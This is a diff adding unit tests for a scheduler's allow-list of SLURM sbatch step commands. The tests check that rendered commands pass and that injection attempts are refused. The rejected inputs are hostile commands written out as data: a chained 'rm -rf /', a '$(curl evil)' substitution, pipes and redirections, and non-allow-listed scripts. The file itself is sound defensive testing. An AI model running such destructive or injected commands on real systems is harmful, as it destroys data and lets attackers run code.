@@ -208,6 +208,39 @@ ck("overriding does not mutate the defaults",
    db.render_step_command(D, "collect") == COLLECT)
 
 
+# ---- the step-command allow-list is the choke point to a cluster shell ----
+# It has to hold on any machine: the scheduler renders on the always-on server
+# while the scripts live in the cluster checkout, so a check that reads the local
+# filesystem refused every legitimate template there and silently stopped the loop.
+ck("a rendered collect command is submittable",
+   db.validate_step_command(db.render_step_command(D, "collect"))[0])
+ck("a rendered filter command is submittable",
+   db.validate_step_command(db.render_step_command(D, "filter"))[0])
+ck("a rendered train command is submittable",
+   db.validate_step_command(db.render_step_command(
+       D, "train", round=9, domain="weed", iter_name="rnd9_train", trace=""))[0])
+for _cmd, _why in (
+        ("sbatch run_m1_merged_seeds.sh; rm -rf /", "chaining"),
+        ("sbatch --export=ALL,X=$(curl evil) run_m1_merged_seeds.sh", "substitution"),
+        ("sbatch run_m1_merged_seeds.sh | tee /tmp/x", "piping"),
+        ("sbatch run_m1_merged_seeds.sh > /tmp/x", "redirection"),
+        ("python run_m1_merged_seeds.sh", "a non-sbatch submitter"),
+        ("sbatch run_evil.sh", "a script outside the allow-list"),
+        ("sbatch run_deploy_model.sh", "a real script the scheduler may not submit"),
+        ("sbatch --export=ALL run_m1_merged_seeds.SH", "a name outside the shape"),
+        ("", "an empty command"),
+):
+    ck("refuses %s" % _why, not db.validate_step_command(_cmd)[0])
+ck("every allow-listed script matches the script shape",
+   all(db._STEP_SCRIPT_RE.fullmatch(x) for x in db._STEP_ALLOWED_SCRIPTS))
+ck("a steps patch naming a script outside the allow-list is refused",
+   not db._validate_steps_patch(D, {"train": "sbatch run_evil.sh"})[0])
+ck("a steps patch choosing its script by field is refused",
+   not db._validate_steps_patch(D, {"train": "sbatch {tier}"})[0])
+ck("a legitimate steps patch is accepted",
+   db._validate_steps_patch(D, {"filter": "sbatch run_s2_dino_scores.sh"})[0])
+
+
 # ---- record_round_step still guards its inputs without Mongo -------------
 ck("record_round_step rejects an unknown step",
    db.record_round_step("coral", "notastep", "done") is None)
